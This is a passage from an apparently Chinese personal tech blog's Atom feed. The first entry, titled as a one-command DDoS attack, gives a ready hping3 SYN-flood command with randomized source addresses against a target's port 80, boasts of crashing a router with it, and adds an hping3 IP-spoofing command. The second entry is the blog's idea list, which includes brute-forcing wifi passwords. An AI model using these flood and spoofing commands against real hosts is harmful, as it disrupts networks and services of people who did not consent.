class="meta prompt_"># </span><span class="language-bash">--flood   sent packets as fast as possible</span></span><br><span class="line">sudo hping3 --rand-source -flood -S -p 80 ip(x.x.x.x)</span><br></pre></td></tr></table></figure><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>hping3还可以IP欺骗<br> 类似arp投毒，原理都很简单，发送假的本机IP<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送三次SYN包到&lt;target IP&gt;,原本应该返回到本机，但是现在返回到了&lt;spoofed IP&gt;</span></span><br><span class="line">hping3 -S &lt;target IP&gt; -a &lt;spoofed IP&gt; -c 3</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一条命令实现DDOS攻击&quot;&gt;&lt;a href=&quot;#一条命令实现DDOS攻击&quot; class=&quot;headerlink&quot; title=&quot;一条命令实现DDOS攻击&quot;&gt;&lt;/a&gt;一条命令实现DDOS攻击&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;这个工具可太强了，一会就把路由器发崩溃了，局</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>仅为乐趣而写博客</title>
    <link href="https://blog.jumhorn.com/README/"/>
    <id>https://blog.jumhorn.com/README/</id>
    <published>2022-02-15T00:00:00.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h1><p>just for fun</p><h1 id="ideas"><a href="#ideas" class="headerlink" title="ideas"></a>ideas</h1><ul><li><p><input disabled="" type="checkbox"> 安装和使用anbox</p></li><li><p><input checked="" disabled="" type="checkbox"> 在centos上搭建vpn</p></li><li><p><input checked="" disabled="" type="checkbox"> 多台公网服务器组建局域网</p><p>  使用vpn</p></li><li><p><input disabled="" type="checkbox"> 建立查找开放端口的对应IP服务</p></li><li><p><input disabled="" type="checkbox"> 暴力破解wifi密码</p></li><li><p><input checked="" disabled="" type="checkbox"> mysql命令行登录的密码加密了吗</p><p>  如果截获报文是可以看到客户端和服务器的机器类型的</p></li><li><p><input checked="" disabled="" type="checkbox"> 搭建邮箱服务器</p><p>  创建邮件列表相当于一个公用邮箱的转发和群发</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;blog&quot;&gt;&lt;a href=&quot;#blog&quot; class=&quot;headerlink&quot; title=&quot;blog&quot;&gt;&lt;/a&gt;blog&lt;/h1&gt;&lt;p&gt;just for fun&lt;/p&gt;
&lt;h1 id=&quot;ideas&quot;&gt;&lt;a href=&quot;#ideas&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
</feed>
